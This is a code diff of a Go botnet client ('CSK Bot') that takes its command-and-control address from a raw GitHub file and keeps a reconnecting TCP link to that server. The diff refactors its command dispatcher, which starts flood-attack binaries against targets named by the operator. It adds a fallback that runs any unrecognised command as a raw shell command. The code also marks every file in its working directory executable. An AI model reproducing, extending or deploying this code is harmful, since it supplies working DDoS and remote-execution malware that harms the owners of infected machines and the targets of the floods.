@@ -1,3 +1,4 @@
+// --- worker.go ---
 package main
 
 import (
@@ -20,7 +21,6 @@ import (
 )
 
 const (
-	// Raw GitHub URL - không có rate limit 60/h như API
 	CONFIG_URL      = "https://raw.githubusercontent.com/tenkhongvps1-ctrl/autocallport/refs/heads/main/port.txt"
 	CONFIG_INTERVAL = 30 * time.Second
 	HTTP_TIMEOUT    = 10 * time.Second
@@ -30,36 +30,39 @@ const (
 
 var configRegex = regexp.MustCompile(`cnc:\s*([^\s]+)\s+port:\s*(\d+)`)
 
-// ==================== STRUCT ====================
+// ==================== TYPES ====================
+
+type ProcessEntry struct {
+	cmd    *exec.Cmd
+	method string
+	ip     string
+	port   int
+}
 
 type CSKBot struct {
-	// Config runtime
 	configMu    sync.RWMutex
 	currentHost string
 	currentPort int
 
-	// Connection
+	connMu         sync.Mutex
 	client         net.Conn
 	isConnected    bool
 	isReconnecting bool
 
-	// Process management
-	activeProcesses map[int]*exec.Cmd
-	processMutex    sync.Mutex
+	cancelRead context.CancelFunc
 
-	// Reconnect timer
+	processMutex    sync.Mutex
+	activeProcesses map[int]*ProcessEntry
+
 	reconnectMu    sync.Mutex
 	reconnectTimer *time.Timer
 
-	// Điều khiển vòng lặp config
 	stopConfigChan chan struct{}
 }
 
 func NewCSKBot() *CSKBot {
 	return &CSKBot{
-		isConnected:     false,
-		isReconnecting:  false,
-		activeProcesses: make(map[int]*exec.Cmd),
+		activeProcesses: make(map[int]*ProcessEntry),
 		stopConfigChan:  make(chan struct{}),
 	}
 }
@@ -68,12 +71,9 @@ func NewCSKBot() *CSKBot {
 
 func (bot *CSKBot) startConfigFetcher() {
 	go func() {
-		// Fetch lần đầu ngay
 		bot.fetchAndUpdateConfig()
-
 		ticker := time.NewTicker(CONFIG_INTERVAL)
 		defer ticker.Stop()
-
 		for {
 			select {
 			case <-ticker.C:
@@ -90,10 +90,7 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
 	defer cancel()
 
-	// Cache-buster để tránh CDN cache của raw.githubusercontent.com
-	cacheBuster := time.Now().UnixNano()
-	url := fmt.Sprintf("%s?_t=%d", CONFIG_URL, cacheBuster)
-
+	url := fmt.Sprintf("%s?_t=%d", CONFIG_URL, time.Now().UnixNano())
 	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
 	if err != nil {
 		log.Printf("[Config] Failed to create request: %v", err)
@@ -121,26 +118,21 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 		return
 	}
 
-	content := strings.TrimSpace(string(body))
-
-	newHost, newPort, ok := parseConfig(content)
+	newHost, newPort, ok := parseConfig(strings.TrimSpace(string(body)))
 	if !ok {
-		log.Printf("[Config] Invalid format: %q", content)
+		log.Printf("[Config] Invalid format")
 		return
 	}
 
-	// So sánh với config hiện tại
 	bot.configMu.RLock()
-	oldHost := bot.currentHost
-	oldPort := bot.currentPort
+	oldHost, oldPort := bot.currentHost, bot.currentPort
 	bot.configMu.RUnlock()
 
 	if oldHost == newHost && oldPort == newPort {
-		return // không đổi
+		return
 	}
 
 	log.Printf("[Config] Update: %s:%d -> %s:%d", oldHost, oldPort, newHost, newPort)
-
 	bot.configMu.Lock()
 	bot.currentHost = newHost
 	bot.currentPort = newPort
@@ -149,17 +141,13 @@ func (bot *CSKBot) fetchAndUpdateConfig() {
 	bot.forceReconnect()
 }
 
-// parseConfig đọc nội dung file, hỗ trợ cả format 1 dòng lẫn nhiều dòng
 func parseConfig(content string) (string, int, bool) {
-	// Thử regex trước (format 1 dòng)
 	if m := configRegex.FindStringSubmatch(content); len(m) == 3 {
 		p, err := strconv.Atoi(m[2])
 		if err == nil && p > 0 && p <= 65535 {
 			return m[1], p, true
 		}
 	}
-
-	// Fallback: parse từng dòng
 	var host string
 	var port int
 	for _, line := range strings.Split(content, "\n") {
@@ -185,9 +173,11 @@ func (bot *CSKBot) getConfig() (string, int) {
 	return bot.currentHost, bot.currentPort
 }
 
-// forceReconnect: ngắt kết nối cũ, kết nối lại với config mới
+// ==================== CONNECT ====================
+
 func (bot *CSKBot) forceReconnect() {
-	// Hủy timer reconnect cũ
+	bot.connMu.Lock()
+
 	bot.reconnectMu.Lock()
 	if bot.reconnectTimer != nil {
 		bot.reconnectTimer.Stop()
@@ -195,7 +185,11 @@ func (bot *CSKBot) forceReconnect() {
 	}
 	bot.reconnectMu.Unlock()
 
-	// Đóng kết nối hiện tại
+	if bot.cancelRead != nil {
+		bot.cancelRead()
+		bot.cancelRead = nil
+	}
+
 	if bot.client != nil {
 		bot.client.Close()
 		bot.client = nil
@@ -203,49 +197,42 @@ func (bot *CSKBot) forceReconnect() {
 
 	bot.isConnected = false
 	bot.isReconnecting = false
+	bot.connMu.Unlock()
 
 	bot.connect()
 }
 
-// ==================== CONNECT ====================
-
 func (bot *CSKBot) connect() {
+	bot.connMu.Lock()
 	if bot.isConnected || bot.isReconnecting {
+		bot.connMu.Unlock()
 		return
 	}
+	bot.connMu.Unlock()
 
 	host, port := bot.getConfig()
 	if host == "" || port == 0 {
-		log.Println("[Connect] No config yet, waiting for first fetch...")
+		log.Println("[Connect] No config yet, waiting...")
 		bot.scheduleReconnect()
 		return
 	}
 
+	bot.connMu.Lock()
 	bot.isReconnecting = true
+	bot.connMu.Unlock()
+
 	addr := fmt.Sprintf("%s:%d", host, port)
-	log.Printf("Attempting to connect to C2 server %s...", addr)
+	log.Printf("[Connect] Connecting to %s...", addr)
 
 	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
 	if err != nil {
-		log.Printf("Failed to connect: %v", err)
+		log.Printf("[Connect] Failed: %v", err)
+		bot.connMu.Lock()
 		bot.isReconnecting = false
+		bot.connMu.Unlock()
 		bot.scheduleReconnect()
 		return
 	}
-
-	bot.client = conn
-	bot.isConnected = true
-	bot.isReconnecting = false
-
-	// Hủy timer reconnect cũ
-	bot.reconnectMu.Lock()
-	if bot.reconnectTimer != nil {
-		bot.reconnectTimer.Stop()
-		bot.reconnectTimer = nil
-	}
-	bot.reconnectMu.Unlock()
-
-	log.Printf("Connected to C2 server %s", addr)
 
 	if tcpConn, ok := conn.(*net.TCPConn); ok {
 		tcpConn.SetKeepAlive(true)
@@ -253,27 +240,56 @@ func (bot *CSKBot) connect() {
 		tcpConn.SetNoDelay(true)
 	}
 
-	go bot.readCommands()
+	ctx, cancel := context.WithCancel(context.Background())
+
+	bot.connMu.Lock()
+	bot.client = conn
+	bot.isConnected = true
+	bot.isReconnecting = false
+	bot.cancelRead = cancel
+
+	bot.reconnectMu.Lock()
+	if bot.reconnectTimer != nil {
+		bot.reconnectTimer.Stop()
+		bot.reconnectTimer = nil
+	}
+	bot.reconnectMu.Unlock()
+
+	bot.connMu.Unlock()
+
+	log.Printf("[Connect] Connected to %s", addr)
+	go bot.readCommands(conn, ctx)
 }
 
-func (bot *CSKBot) readCommands() {
-	reader := bufio.NewReader(bot.client)
+// ==================== READ & DISPATCH ====================
 
+func (bot *CSKBot) readCommands(conn net.Conn, ctx context.Context) {
+	reader := bufio.NewReader(conn)
 	for {
-		bot.client.SetReadDeadline(time.Now().Add(READ_TIMEOUT))
+		select {
+		case <-ctx.Done():
+			log.Println("[Reader] Context cancelled, exiting.")
+			return
+		default:
+		}
 
+		conn.SetReadDeadline(time.Now().Add(READ_TIMEOUT))
 		data, err := reader.ReadString('\n')
 		if err != nil {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+			}
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				continue
 			}
-			log.Printf("Connection error: %v", err)
+			log.Printf("[Reader] Connection error: %v", err)
 			bot.handleDisconnect()
 			return
 		}
 
-		commands := strings.Split(strings.TrimSpace(data), "\n")
-		for _, command := range commands {
+		for _, command := range strings.Split(strings.TrimSpace(data), "\n") {
 			command = strings.TrimSpace(command)
 			if command != "" {
 				bot.executeCommand(command)
@@ -284,53 +300,218 @@ func (bot *CSKBot) readCommands() {
 
 // ==================== COMMAND EXECUTION ====================
 
+// executeCommand parse format mà main.go gửi:
+//
+//	csk-tsunami <url> <dur> 0 16 --random-path --rotate 2
+//	csk-kraken  <host> <port> <dur> 1000 gb 1400
+//	csk-pulse   <host> <port> <dur> 1000 pk 0
+//	csk-deluge  <host> <dur> 22 333
+//	stop <method> <ip>
+//	stop <method> <ip> <port>
 func (bot *CSKBot) executeCommand(command string) {
-	if command == "" {
-		return
-	}
-
-	if strings.HasPrefix(command, "stop") {
-		bot.handleStopCommand(command)
-		return
-	}
-
 	parts := strings.Fields(command)
 	if len(parts) == 0 {
 		return
 	}
 
-	method := strings.ToLower(parts[0])
-	args := parts[1:]
+	verb := strings.ToLower(parts[0])
 
-	var scriptToRun string
-	var isExecutable bool
-
-	switch method {
-	case "csk-tsunami":
-		scriptToRun = "flood.js"
-	case "csk-pulse":
-		scriptToRun = "./csk-pulse"
-		isExecutable = true
-	case "csk-kraken":
-		scriptToRun = "./csk-kraken"
-		isExecutable = true
-	case "csk-deluge":
-		scriptToRun = "./lid2hz"
-		isExecutable = true
-	default:
-		log.Println("Unknown method:", method)
+	if verb == "stop" {
+		bot.handleStopCommand(parts)
 		return
 	}
 
-	if _, err := os.Stat(scriptToRun); os.IsNotExist(err) {
-		log.Println("Script not found:", scriptToRun)
+	switch verb {
+	case "csk-tsunami":
+		// csk-tsunami <url> <dur> 0 16 --random-path --rotate 2
+		if len(parts) < 3 {
+			log.Printf("[CMD] csk-tsunami: malformed command: %q", command)
+			return
+		}
+		ip := parts[1]
+		bot.launchScript("./lizhds", true, verb, ip, 0, parts[1:]...)
+
+	case "csk-kraken":
+		// csk-kraken <host> <port> <dur> 1000 gb 1400
+		if len(parts) < 4 {
+			log.Printf("[CMD] csk-kraken: malformed command: %q", command)
+			return
+		}
+		ip := parts[1]
+		port := atoiSafe(parts[2])
+		bot.launchScript("./csk-kraken", true, verb, ip, port, parts[1:]...)
+
+	case "csk-pulse":
+		// csk-pulse <host> <port> <dur> 1000 pk 0
+		if len(parts) < 4 {
+			log.Printf("[CMD] csk-pulse: malformed command: %q", command)
+			return
+		}
+		ip := parts[1]
+		port := atoiSafe(parts[2])
+		bot.launchScript("./csk-pulse", true, verb, ip, port, parts[1:]...)
+
+	case "csk-deluge":
+		// csk-deluge <host> <dur> 22 333
+		if len(parts) < 3 {
+			log.Printf("[CMD] csk-deluge: malformed command: %q", command)
+			return
+		}
+		ip := parts[1]
+		bot.launchScript("./lid2hz", true, verb, ip, 0, parts[1:]...)
+
+	default:
+		// Raw shell command từ moderator (!cmd) — chạy qua sh -c
+		bot.launchShell(command)
+	}
+}
+
+func atoiSafe(s string) int {
+	v, _ := strconv.Atoi(s)
+	return v
+}
+
+func (bot *CSKBot) launchScript(binary string, isExecutable bool, method, ip string, port int, args ...string) {
+	if _, err := os.Stat(binary); os.IsNotExist(err) {
+		log.Printf("[Launch] Binary not found: %s", binary)
 		return
 	}
 
 	bot.chmodAllInCwd()
 
-	log.Printf("Executing: %s with args: %v", method, args)
-	bot.runScript(scriptToRun, args, isExecutable)
+	var cmd *exec.Cmd
+	if isExecutable {
+		cmd = exec.Command(binary, args...)
+	} else {
+		cmdArgs := append([]string{binary}, args...)
+		cmd = exec.Command("node", cmdArgs...)
+	}
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.Stdin = nil
+
+	if err := cmd.Start(); err != nil {
+		log.Printf("[Launch] Failed to start %s: %v", binary, err)
+		return
+	}
+
+	pid := cmd.Process.Pid
+	entry := &ProcessEntry{cmd: cmd, method: method, ip: ip, port: port}
+
+	bot.processMutex.Lock()
+	bot.activeProcesses[pid] = entry
+	bot.processMutex.Unlock()
+
+	log.Printf("[Launch] PID %d | %s | %s | port=%d", pid, method, ip, port)
+
+	go func() {
+		err := cmd.Wait()
+		bot.processMutex.Lock()
+		delete(bot.activeProcesses, pid)
+		bot.processMutex.Unlock()
+		if err != nil {
+			log.Printf("[PID %d] exited with error: %v", pid, err)
+		} else {
+			log.Printf("[PID %d] exited cleanly.", pid)
+		}
+	}()
+}
+
+func (bot *CSKBot) launchShell(command string) {
+	cmd := exec.Command("sh", "-c", command)
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.Stdin = nil
+
+	if err := cmd.Start(); err != nil {
+		log.Printf("[Shell] Failed to start %q: %v", command, err)
+		return
+	}
+
+	pid := cmd.Process.Pid
+	entry := &ProcessEntry{cmd: cmd, method: "shell", ip: "localhost", port: 0}
+
+	bot.processMutex.Lock()
+	bot.activeProcesses[pid] = entry
+	bot.processMutex.Unlock()
+
+	log.Printf("[Shell] PID %d | %s", pid, command)
+
+	go func() {
+		err := cmd.Wait()
+		bot.processMutex.Lock()
+		delete(bot.activeProcesses, pid)
+		bot.processMutex.Unlock()
+		if err != nil {
+			log.Printf("[Shell PID %d] exited with error: %v", pid, err)
+		} else {
+			log.Printf("[Shell PID %d] exited cleanly.", pid)
+		}
+	}()
+}
+
+// ==================== STOP COMMAND ====================
+
+// handleStopCommand parse format main gửi:
+//
+//	stop <method> <ip>           → dừng process khớp method + ip
+//	stop <method> <ip> <port>   → dừng process khớp method + ip + port
+func (bot *CSKBot) handleStopCommand(parts []string) {
+	if len(parts) < 3 {
+		log.Println("[Stop] No target specified, stopping all processes.")
+		bot.stopAllProcesses()
+		return
+	}
+
+	method := strings.ToLower(parts[1])
+	ip := parts[2]
+	filterPort := -1
+	if len(parts) >= 4 {
+		filterPort = atoiSafe(parts[3])
+	}
+
+	bot.processMutex.Lock()
+	defer bot.processMutex.Unlock()
+
+	killed := 0
+	for pid, entry := range bot.activeProcesses {
+		if entry.method != method || entry.ip != ip {
+			continue
+		}
+		if filterPort >= 0 && entry.port != filterPort {
+			continue
+		}
+		if entry.cmd.Process != nil {
+			if err := entry.cmd.Process.Kill(); err != nil {
+				log.Printf("[Stop] Kill PID %d error: %v", pid, err)
+			} else {
+				log.Printf("[Stop] Killed PID %d | %s | %s | port=%d", pid, method, ip, entry.port)
+				killed++
+			}
+		}
+		delete(bot.activeProcesses, pid)
+	}
+
+	if killed == 0 {
+		log.Printf("[Stop] No matching process for method=%s ip=%s port=%d", method, ip, filterPort)
+	} else {
+		log.Printf("[Stop] Killed %d process(es).", killed)
+	}
+}
+
+func (bot *CSKBot) stopAllProcesses() {
+	bot.processMutex.Lock()
+	defer bot.processMutex.Unlock()
+	for pid, entry := range bot.activeProcesses {
+		if entry.cmd.Process != nil {
+			if err := entry.cmd.Process.Kill(); err != nil {
+				log.Printf("[StopAll] Kill PID %d error: %v", pid, err)
+			} else {
+				log.Printf("[StopAll] Killed PID %d", pid)
+			}
+		}
+		delete(bot.activeProcesses, pid)
+	}
 }
 
 func (bot *CSKBot) chmodAllInCwd() {
@@ -343,96 +524,25 @@ func (bot *CSKBot) chmodAllInCwd() {
 		if e.IsDir() {
 			continue
 		}
-		name := e.Name()
-		if err := os.Chmod(name, 0755); err != nil {
-			log.Printf("[Chmod] %s failed: %v", name, err)
-		} else {
-			log.Printf("[Chmod] +x %s", name)
+		if err := os.Chmod(e.Name(), 0755); err != nil {
+			log.Printf("[Chmod] %s: %v", e.Name(), err)
 		}
 	}
-}
-
-func (bot *CSKBot) handleStopCommand(command string) {
-	parts := strings.Fields(command)
-	if len(parts) < 2 {
-		bot.stopAllProcesses()
-		return
-	}
-
-	stopMethod := parts[1]
-	log.Printf("Stop command received for: %s", stopMethod)
-	bot.stopAllProcesses()
-}
-
-func (bot *CSKBot) stopAllProcesses() {
-	bot.processMutex.Lock()
-	defer bot.processMutex.Unlock()
-
-	for pid, cmd := range bot.activeProcesses {
-		if cmd.Process != nil {
-			if err := cmd.Process.Kill(); err != nil {
-				log.Printf("Error stopping process %d: %v", pid, err)
-			} else {
-				log.Printf("Stopped process PID: %d", pid)
-			}
-		}
-		delete(bot.activeProcesses, pid)
-	}
-}
-
-func (bot *CSKBot) runScript(scriptToRun string, args []string, isExecutable bool) {
-	var cmd *exec.Cmd
-
-	if isExecutable {
-		cmd = exec.Command(scriptToRun, args...)
-	} else {
-		cmdArgs := append([]string{scriptToRun}, args...)
-		cmd = exec.Command("node", cmdArgs...)
-	}
-
-	cmd.Stdout = nil
-	cmd.Stderr = nil
-	cmd.Stdin = nil
-
-	if err := cmd.Start(); err != nil {
-		log.Printf("Error running script: %v", err)
-		return
-	}
-
-	pid := cmd.Process.Pid
-	log.Printf("Started process PID: %d", pid)
-
-	bot.processMutex.Lock()
-	bot.activeProcesses[pid] = cmd
-	bot.processMutex.Unlock()
-
-	go func() {
-		err := cmd.Wait()
-
-		bot.processMutex.Lock()
-		delete(bot.activeProcesses, pid)
-		bot.processMutex.Unlock()
-
-		if err != nil {
-			log.Printf("Process %d exited with error: %v", pid, err)
-		} else {
-			log.Printf("Process %d exited successfully", pid)
-		}
-	}()
 }
 
 // ==================== DISCONNECT & RECONNECT ====================
 
 func (bot *CSKBot) handleDisconnect() {
-	log.Println("Connection to C2 server closed")
+	bot.connMu.Lock()
 	bot.isConnected = false
 	bot.isReconnecting = false
-
 	if bot.client != nil {
 		bot.client.Close()
 		bot.client = nil
 	}
+	bot.connMu.Unlock()
 
+	log.Println("[Disconnect] Connection lost, scheduling reconnect.")
 	bot.scheduleReconnect()
 }
 
@@ -444,7 +554,7 @@ func (bot *CSKBot) scheduleReconnect() {
 		return
 	}
 
-	log.Println("Scheduling reconnect in 5 seconds...")
+	log.Printf("[Reconnect] Retrying in %v...", RECONNECT_DELAY)
 	bot.reconnectTimer = time.AfterFunc(RECONNECT_DELAY, func() {
 		bot.reconnectMu.Lock()
 		bot.reconnectTimer = nil
@@ -456,12 +566,10 @@ func (bot *CSKBot) scheduleReconnect() {
 // ==================== CLEANUP ====================
 
 func (bot *CSKBot) cleanup() {
-	log.Println("Cleaning up...")
+	log.Println("[Cleanup] Shutting down...")
 
-	// Dừng config fetcher (chỉ đóng 1 lần)
 	select {
 	case <-bot.stopConfigChan:
-		// đã đóng rồi
 	default:
 		close(bot.stopConfigChan)
 	}
@@ -473,37 +581,38 @@ func (bot *CSKBot) cleanup() {
 	}
 	bot.reconnectMu.Unlock()
 
+	bot.connMu.Lock()
+	if bot.cancelRead != nil {
+		bot.cancelRead()
+		bot.cancelRead = nil
+	}
 	if bot.client != nil {
 		bot.client.Close()
 		bot.client = nil
 	}
+	bot.connMu.Unlock()
 
 	bot.stopAllProcesses()
-	bot.isConnected = false
-	bot.isReconnecting = false
+	log.Println("[Cleanup] Done.")
 }
 
 // ==================== MAIN ====================
 
 func main() {
-	log.Println("Starting CSK Bot (Go version, dynamic CNC config via raw)...")
+	log.Println("[CSK Worker] Starting...")
 
 	bot := NewCSKBot()
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-
 	go func() {
 		<-sigChan
-		log.Println("Received signal, shutting down...")
 		bot.cleanup()
 		os.Exit(0)
 	}()
 
-	// Bắt đầu fetch config mỗi 30s
 	bot.startConfigFetcher()
 
-	// Chờ fetch lần đầu hoàn tất (tối đa 10s)
 	for i := 0; i < 50; i++ {
 		host, port := bot.getConfig()
 		if host != "" && port != 0 {
@@ -514,12 +623,11 @@ func main() {
 
 	host, port := bot.getConfig()
 	if host == "" || port == 0 {
-		log.Println("No config fetched yet, will retry via reconnect schedule.")
+		log.Println("[Main] No config after wait, will retry via reconnect.")
 	} else {
-		log.Printf("[Main] Initial config: %s:%d", host, port)
+		log.Printf("[Main] Config ready: %s:%d", host, port)
 	}
 
 	bot.connect()
-
 	select {}
 }
